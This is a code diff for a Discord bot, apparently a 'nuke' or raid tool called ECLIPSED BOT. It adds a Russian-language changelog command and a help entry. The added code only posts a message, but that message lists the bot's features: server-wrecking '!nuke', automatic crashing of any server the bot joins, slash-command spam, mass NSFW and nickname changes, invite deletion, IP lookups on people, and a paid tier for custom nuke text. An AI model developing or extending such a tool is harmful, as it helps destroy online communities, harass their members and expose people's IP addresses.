@@ -474,6 +474,60 @@ async def blocked_guilds_cmd(ctx):
 bot.remove_command("help")
 
 
+@bot.command(name="changelog")
+@wl_check()
+async def changelog(ctx):
+    embed = discord.Embed(
+        title="📋 CHANGELOG — ECLIPSED BOT",
+        description="История обновлений бота.",
+        color=0x0a0a0a
+    )
+    embed.add_field(
+        name="🆕 v1.3 — Текущая версия",
+        value=(
+            "• Добавлена **Premium** система — `!nuke [текст]` со своим текстом\n"
+            "• Добавлена блокировка серверов — `!block_guild` / `!unblock_guild`\n"
+            "• Команда `!set_spam_text` — овнер может менять дефолтный текст нюка\n"
+            "• При `!nuke` каналы переименовываются в **DavaidKa Best**\n"
+            "• Без Premium текст в `!nuke` игнорируется, нюк всё равно запускается\n"
+            "• Полностью переработан дизайн всех меню в тёмном стиле ☠️"
+        ),
+        inline=False
+    )
+    embed.add_field(
+        name="⚡ v1.2",
+        value=(
+            "• Управление ботом через ЛС — выбор сервера кнопками\n"
+            "• Команды `!guilds`, `!setguild`, `!invlink`\n"
+            "• Owner Panel — `!owner_help`\n"
+            "• Owner Whitelist — `!owl_add` / `!owl_remove`"
+        ),
+        inline=False
+    )
+    embed.add_field(
+        name="💀 v1.1",
+        value=(
+            "• Авто-краш при входе бота на сервер — `!auto_nuke`\n"
+            "• Спам slash команды — `/sp`, `/spkd`\n"
+            "• Whitelist система — `!wl_add` / `!wl_remove` / `!wl_list`\n"
+            "• Команды `!cleanup`, `!addch`, `!rename`, `!nicks_all`"
+        ),
+        inline=False
+    )
+    embed.add_field(
+        name="☠️ v1.0 — Запуск",
+        value=(
+            "• Базовый краш — `!nuke`, `!stop`\n"
+            "• `!nsfw_all`, `!unnsfw_all`, `!invs_delete`\n"
+            "• `!webhooks`, `!ip`"
+        ),
+        inline=False
+    )
+    embed.set_footer(text="☠️ ECLIPSED SQUAD  |  davaidkatt")
+    embed.set_thumbnail(url="https://i.imgur.com/8Km9tLL.png")
+    await ctx.send(embed=embed)
+
+
 @bot.command(name="help")
 @wl_check()
 async def help_cmd(ctx):
@@ -521,6 +575,7 @@ async def help_cmd(ctx):
             "`!webhooks` — список вебхуков\n"
             "`!ip [адрес]` — пробить IP\n"
             "`!inv` — ссылка для добавления бота\n"
+            "`!changelog` — история обновлений бота\n"
             "`/sp [кол-во] [текст]` — спам\n"
             "`/spkd [задержка] [кол-во] [текст]` — спам с задержкой"
         ),
